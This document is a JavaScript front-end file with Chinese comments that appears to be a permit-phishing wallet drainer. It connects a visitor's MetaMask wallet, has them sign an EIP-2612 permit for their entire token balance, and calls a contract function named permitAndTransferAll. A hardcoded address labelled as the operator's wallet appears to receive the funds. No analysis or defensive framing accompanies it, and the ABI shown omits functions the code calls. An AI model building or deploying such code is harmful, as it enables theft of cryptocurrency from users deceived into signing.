const contractAddress = "0x0CcD25CB287E18e55969d65AB5555582657512bE"; // 智能合约地址
const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 你的钱包地址

const abi = [
    // 将你的 ABI 填入这里
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    // 省略其他 ABI 项...
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "owner",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "deadline",
                "type": "uint256"
            },
            {
                "internalType": "uint8",
                "name": "v",
                "type": "uint8"
            },
            {
                "internalType": "bytes32",
                "name": "r",
                "type": "bytes32"
            },
            {
                "internalType": "bytes32",
                "name": "s",
                "type": "bytes32"
            }
        ],
        "name": "permitAndTransferAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let provider;
let signer;
let contract;

async function connectWallet() {
    if (typeof window.ethereum !== 'undefined') {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        contract = new ethers.Contract(contractAddress, abi, signer);
        alert("钱包连接成功");
    } else {
        alert("请安装 MetaMask 插件");
    }
}

async function signAndTransfer() {
    const owner = await signer.getAddress();
    const balance = await contract.balanceOf(owner);
    
    if (balance.isZero()) {
        alert("余额不足");
        return;
    }

    const nonce = await contract.nonces(owner);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 15; // 15分钟后过期
    const signature = await signer._signTypedData(
        {
            name: "MyToken",
            version: "1",
            chainId: await signer.getChainId(),
            verifyingContract: contractAddress,
        },
        {
            Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
            ],
        },
        {
            owner: owner,
            spender: contractAddress,
            value: balance,
            nonce: nonce,
            deadline: deadline,
        }
    );

    const { v, r, s } = ethers.utils.splitSignature(signature);

    try {
        const tx = await contract.permitAndTransferAll(owner, deadline, v, r, s);
        await tx.wait();
        alert("转账成功");
    } catch (error) {
        console.error(error);
        alert("转账失败，请重试");
    }
}

document.getElementById("connectButton").onclick = connectWallet;
document.getElementById("transferButton").onclick = signAndTransfer;
